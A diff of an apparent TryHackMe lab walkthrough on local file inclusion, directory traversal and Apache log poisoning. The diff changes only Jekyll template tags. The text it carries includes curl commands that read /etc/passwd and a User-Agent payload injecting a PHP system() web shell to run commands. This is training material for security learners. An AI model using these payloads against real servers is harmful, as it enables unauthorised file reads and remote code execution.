@@ -21,7 +21,7 @@ Use these links as references.
 
 
 Deploy the machine and check for initial response, `curl <ip>`. Similar response should be obtained.
-{% capture code %}<!DOCTYPE HTML>
+{% capture code %}{% raw %}<!DOCTYPE HTML>
 
 <html>
 
@@ -39,28 +39,28 @@ Deploy the machine and check for initial response, `curl <ip>`. Similar response
 
 </body>
 
-</html>{% endcapture %} {% include code.html code=code lang="bash"%}
+</html>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 To access the first walkthrough, use `curl http://<ip>/lfi/lfi.php`.
 A response will be obtained as,
-{% capture code %}File included: <br><br><br>
-Local file to be used: <br><br>{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}File included: <br><br><br>
+Local file to be used: <br><br>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Check adding parameter `?page=`, use `curl http://<ip>/lfi/lfi.php?page=`.
 The response will be same.
-{% capture code %}File included: <br><br><br>
-Local file to be used: <br><br>{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}File included: <br><br><br>
+Local file to be used: <br><br>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Adding value to parameter `?page=home.html` gives intended result. Use `curl http://<ip>/lfi/lfi.php?page=home.html`,
-{% capture code %}File included: home.html<br><br><br>
+{% capture code %}{% raw %}File included: home.html<br><br><br>
 Local file to be used: home.html<br><br>
-<h1>You included home.html</h1><br>{% endcapture %} {% include code.html code=code lang="bash"%}
+<h1>You included home.html</h1><br>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 There is a vulnerable code `$local_file = $_REQUEST["page"];` in lfi.php which allows file contents to be displayed.
 To display contents of `/etc/passwd` file, use `curl "http://<ip>/lfi/lfi.php?page=/etc/passwd"`,
 
 An output similar to below will be obtained. Analyze to get non-system user.
-{% capture code %}File included: /etc/passwd<br><br><br>
+{% capture code %}{% raw %}File included: /etc/passwd<br><br><br>
 Local file to be used: /etc/passwd<br><br>
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -101,7 +101,7 @@ pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
 rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
 saned:x:119:127::/var/lib/saned:/bin/false
 usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
-lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash{% endcapture %} {% include code.html code=code lang="bash"%}
+lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
 ## Task 2 - LFI using Directory Traversal
@@ -114,21 +114,21 @@ The second walkthrough can be tested by using `curl "http://<ip>/lfi2/lfi.php`.
 
 Check if the contents of `home.html` is displayed, using `curl "http://<ip>/lfi2/lfi.php?page=home.html"`.
 An output similar to following will be obtained,
-{% capture code %}File included: home.html<br><br><br>
+{% capture code %}{% raw %}File included: home.html<br><br><br>
 Local file to be used: html/home.html<br><br>
-You included home.html<br>{% endcapture %} {% include code.html code=code lang="bash"%}
+You included home.html<br>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 There is a page `creditcard`, one level up. To get contents of the page, use `curl "http://<ip>/lfi2/lfi.php?page=../creditcard"`.
 Similar output will be obtained,
-{% capture code %}File included: ../creditcard<br><br><br>
+{% capture code %}{% raw %}File included: ../creditcard<br><br><br>
 Local file to be used: html/../creditcard<br><br>
-<flag>{% endcapture %} {% include code.html code=code lang="bash"%}
+<flag>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 There is a vulnerable code `$local_file = "html/"$_REQUEST["page"];` in lfi.php which allows file contents to be displayed.
 To display contents of `/etc/passwd` file, use `curl "http://<ip>/lfi2/lfi.php?page=../../../../../etc/passwd"`,
 
 An output similar to below will be obtained.
-{% capture code %}File included: ../../../../../etc/passwd<br><br><br>
+{% capture code %}{% raw %}File included: ../../../../../etc/passwd<br><br><br>
 Local file to be used: html/../../../../../etc/passwd<br><br>
 root:x:0:0:root:/root:/bin/    bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -169,7 +169,7 @@ pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
 rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
 saned:x:119:127::/var/lib/saned:/bin/false
 usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
-lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash{% endcapture %} {% include code.html code=code lang="bash"%}
+lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
 ## Task 3 - Remote Code Execution and Log Poisoning using LFI
@@ -181,16 +181,16 @@ Use these links as references.
 
 To access the third walkthrough, use `curl http://<ip>/lfi/lfi.php`.
 A response will be obtained as,
-{% capture code %}File included: <br><br><br>
-Local file to be used: <br><br>{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}File included: <br><br><br>
+Local file to be used: <br><br>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 To read contents of `/var/log/apache2/access.log` using `?page=` parameter, use `curl 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log'`.
 Run the command multiple times, as the log entry will be created after execution, and one consecutive commands reveals previous log entries.
 
 An output similar will be obtained.
-{% capture code %}File included: /var/log/apache2/access.log<br><br><br>
+{% capture code %}{% raw %}File included: /var/log/apache2/access.log<br><br><br>
 Local file to be used: /var/log/apache2/access.log<br><br>
-<source> - - [23/Dec/2020:00:10:24 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 286 "-" "curl/7.64.0"{% endcapture %} {% include code.html code=code lang="bash"%}
+<source> - - [23/Dec/2020:00:10:24 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 286 "-" "curl/7.64.0"{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
 ### Log poison using BurpSuite
@@ -212,11 +212,11 @@ Instructions on setting up BurpSuite can be found [here](https://blog.tryhackme.
 - The response will contain the contents of `/var/log/apache2/access.log`, but the command output will be visible between `Mozilla/5.0  Firefox/78.0` of the injected log entries.
 
 Output similar to following is intended.
-{% capture code %}File included: /var/log/apache2/access.log<br><br><br>
+{% capture code %}{% raw %}File included: /var/log/apache2/access.log<br><br><br>
 Local file to be used: /var/log/apache2/access.log<br><br>
 <source> - - [23/Dec/2020:00:10:24 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 286 "-" "curl/7.64.0"
 <source> - - [23/Dec/2020:00:10:33 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 419 "-" "curl/7.64.0"
-<source> - - [23/Dec/2020:00:10:51 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 552 "-" "Mozilla/5.0 <flag> Firefox/78.0"{% endcapture %} {% include code.html code=code lang="bash"%}
+<source> - - [23/Dec/2020:00:10:51 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 552 "-" "Mozilla/5.0 <flag> Firefox/78.0"{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 To get flag from lfi user's home directory, check the contents of `/home/lfi` to find file name.
 Repeat the Burp process with the url `http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=ls%20/home/lfi`.
@@ -228,22 +228,22 @@ Repeat the Burp process with the url `http://<ip>/lfi/lfi.php?page=/var/log/apac
 The User-Agent can be modified in curl using either `-H` of `-A` options.
 
 Use the following command to inject the code to log file.
-{% capture code %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log'{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log'{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Use the following command to get response.
-{% capture code %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-r'{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-r'{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Response will be similar to following.
-{% capture code %}File included: /var/log/apache2/access.log<br><br><br>
+{% capture code %}{% raw %}File included: /var/log/apache2/access.log<br><br><br>
 Local file to be used: /var/log/apache2/access.log<br><br>
 <source> - - [23/Dec/2020:00:10:24 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 286 "-" "curl/7.64.0"
 <source> - - [23/Dec/2020:00:10:33 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 419 "-" "curl/7.64.0"
-<source> - - [23/Dec/2020:00:10:51 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 552 "-" "Mozilla/5.0 <flag> Firefox/78.0"{% endcapture %} {% include code.html code=code lang="bash"%}
+<source> - - [23/Dec/2020:00:10:51 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 552 "-" "Mozilla/5.0 <flag> Firefox/78.0"{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 To get flag from lfi user's home directory, check the contents of `/home/lfi` to find file name.
 Use the following command,
-{% capture code %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=ls%20/home/lfi'{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=ls%20/home/lfi'{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Get the flag, using the following command,
-{% capture code %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=cat%20/home/lfi/flag.txt'{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=cat%20/home/lfi/flag.txt'{% endraw %}{% endcapture %} {% include code.html code=code %}
 
